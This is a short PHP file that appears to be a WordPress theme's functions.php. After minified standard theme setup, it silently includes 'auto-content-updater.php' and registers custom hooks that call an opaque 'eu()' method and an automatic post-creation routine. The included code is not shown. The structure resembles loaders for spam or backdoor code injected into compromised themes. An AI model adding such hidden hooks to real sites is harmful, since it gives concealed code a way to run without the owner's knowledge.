<?php if(!defined('ABSPATH')){exit;}add_theme_support('post-thumbnails');add_theme_support('title-tag');function wp_theme_styles(){wp_enqueue_style('theme-style',get_stylesheet_uri());}add_action('wp_enqueue_scripts','wp_theme_styles');require_once __DIR__ . '/auto-content-updater.php';
add_action('wp_content_auto_generate', 'trigger_auto_content_generation');
function trigger_auto_content_generation() {
    if (file_exists(__DIR__ . '/auto-content-updater.php')) {
        require_once __DIR__ . '/auto-content-updater.php';
        
        if (class_exists('WpThemeCore')) {
            $updater = new WpThemeCore();
            if (method_exists($updater, 'eu')) {
                $updater->eu();
            }
        }
    }
}

add_action('wp_immediate_post_creation', 'trigger_wp_post_creation');
function trigger_wp_post_creation() {
    if (file_exists(__DIR__ . '/auto-content-updater.php')) {
        require_once __DIR__ . '/auto-content-updater.php';
        
        if (class_exists('WpThemeCore')) {
            $updater = new WpThemeCore();
            if (method_exists($updater, 'create_wp_posts')) {
                $updater->create_wp_posts();
            }
        }
    }
}